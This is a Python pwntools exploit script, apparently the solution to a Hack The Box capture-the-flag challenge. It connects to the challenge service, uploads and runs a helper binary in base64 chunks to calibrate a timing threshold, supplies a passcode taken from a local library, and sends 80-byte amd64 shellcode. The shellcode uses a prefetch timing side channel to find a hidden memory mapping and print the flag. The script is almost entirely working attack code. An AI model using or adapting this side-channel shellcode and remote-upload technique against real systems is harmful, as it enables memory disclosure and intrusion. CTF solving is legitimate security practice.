#!/usr/bin/env python3

from pwn import *
from ctypes import CDLL, c_uint32
import gzip

os.chdir(os.path.dirname(os.path.abspath(__file__)))

context.arch        = 'amd64'

THRESHOLD_PARAM     = None
TEST_ITERATIONS     = 0x10
CHUNK_SIZE          = 0x250
    
# get passcode function
lib                     = CDLL('./passcode.so')
leak_passcode           = lib.passcode
leak_passcode.argtypes  = []
leak_passcode.restype   = c_uint32

def conn():
    if args.REMOTE:
        p = remote(*args.REMOTE.split(':'))
        if b"proof of work" in p.recvline():
            with log.progress("solving POW") as prog:
                with context.silent:
                    sol = process(p.recvline().decode().strip(), shell=True).recvline()
                prog.success(sol.decode())
            p.sendlineafter(b'solution: ', sol)
    else:
        p = process('../insidious')
    return p

def get_threshold():
    global THRESHOLD_PARAM
    p = conn()

    p.sendlineafter(b'retreat from the daunting path ahead? [y/n]', b'n')

    compressed_data = gzip.compress(open('./test','rb').read())
    
    p.recvuntil(b'master the art of navigating supernatural realms\n')
    
    for i in range(0,len(compressed_data),CHUNK_SIZE):
        p.sendline(f'echo {b64e(compressed_data[i:i+CHUNK_SIZE])} | base64 -d >> /tmp/test.gz'.encode())
        
    p.sendline(b'cat /tmp/test.gz | gzip -d > /tmp/test && rm /tmp/test.gz')
    p.sendline(b'chmod +x /tmp/test && /tmp/test')
    
    with log.progress(f'Trying to find the Threshold') as l:
        p.recvuntil(b'prefetch_on_valid_map:')
        valid_map = int(p.recvline().strip())
        p.recvuntil(b'prefetch_on_invalid_map:')
        invalid_map = int(p.recvline().strip())
        THRESHOLD_PARAM = (valid_map+invalid_map)//2
    p.sendline(b'exit')
    p.close()


get_threshold()

shellcode = asm(f'''    
    mov r14,0xffffff

    loopStart:
        mov esi,r14d
        shl rsi,0x10
        
        xor ecx,ecx
        xor ebx,ebx
        mov cl,0x10
        
        prefetch_time:
            rdtsc
            mov edi,eax
            lfence

            prefetchnta     [rsi]
            prefetcht2      [rsi]
            prefetcht1      [rsi]
            prefetcht0      [rsi]

            lfence
            rdtsc
            sub eax,edi
            
            add ebx,eax
            loop prefetch_time
                  
                    
        cmp ebx,{THRESHOLD_PARAM}
        jb win

        dec r14
        jne loopStart

        win:
            mov edi,0x1
            mov edx,0x60

            xor eax,eax
            mov al,SYS_write
            syscall

''')

assert len(shellcode) <= 80

def exploit():
    global p
    p = conn()

    p.sendlineafter(b'retreat from the daunting path ahead? [y/n]', b'y')
    p.sendlineafter(b'Can you share the crucial passcode that will unlock the mysterious realm\'s exit? ', str(leak_passcode()).encode())
    p.sendafter(b'Can you share the detailed 80-step guide for a systematic path to the exit? ', shellcode)

    return p.recvall()


# moment of truth
log.info(f'Trying with Threshold of {THRESHOLD_PARAM}')
for _ in range(10):
    with log.progress('Flag....') as l:
        ret = exploit()
        
        if ret is not None and b'{' in ret:
            flag = ret[ret.find(b'HTB{'):ret.find(b'}')+1]
            l.success(flag.decode())
            exit(0)
        else:
            l.failure()
            p.close()
            time.sleep(1)
